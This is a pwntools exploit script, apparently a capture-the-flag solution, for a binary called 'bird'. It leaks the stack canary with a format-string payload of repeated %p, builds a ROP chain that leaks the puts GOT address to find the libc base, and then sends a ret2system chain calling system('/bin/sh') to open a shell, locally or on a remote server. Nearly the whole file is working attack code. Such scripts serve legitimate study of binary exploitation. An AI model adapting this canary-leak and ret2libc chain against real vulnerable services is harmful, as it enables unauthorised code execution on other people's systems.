from pwn import *
from time import sleep


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './bird'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

offset = 88  # Canary offset

# Lib-C library
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

# Create ROP object from challenge binary
rop = ROP(elf)

ret = rop.find_gadget(['ret'])[0]  # Stack alignment

# Leak values from the stack - The c56500c7ab26a5100d4672cf18835690 value found from static analysis/debugging
io.sendlineafter(
    b'Name your favorite bird:',
    'c56500c7ab26a5100d4672cf18835690 %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p')

sleep(0.5)

# Canary value
io.recv()
leaked_addresses = io.recvS().split(" ")
canary = int(leaked_addresses[-9:-8][0][:18], 16)
info('canary = 0x%x (%d)', canary, canary)

rop.puts(elf.got.puts)  # Leak got.puts
rop.restart()  # Return for 2nd payload

# Print ROP gadgets and ROP chain
# pprint(rop.gadgets)
# pprint(rop.dump())

# Build payload (leak puts)
payload = flat([
    offset * b'A',  # Pad to canary (88)
    canary,  # Our leaked canary (8)
    8 * b'A',  # Pad to Ret pointer (8)
    rop.chain()  # ROP chain
])

# Send the payload
io.sendline(payload)
io.recvlines(2)

# Retrieve got.puts address
got_puts = unpack(io.recvline()[:6].ljust(8, b"\x00"))
info("leaked got_puts: %#x", got_puts)
libc.address = got_puts - libc.symbols.puts
info("libc_base: %#x", libc.address)

# Create ROP object from Lib-C
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\x00')))  # system('/bin/sh')

# Print ROP gadgets and ROP chain
# pprint(rop.gadgets)
# pprint(rop.dump())

# Build payload (ret2system)
payload = flat([
    offset * b'A',  # Pad to canary (88)
    canary,  # Our leaked canary (8)
    8 * b'A',  # Pad to Ret pointer (8)
    ret,  # Stack alignment
    rop.chain()  # ROP chain
])

# Send the payload
io.sendline(payload)

# Get our flag/shell
io.interactive()
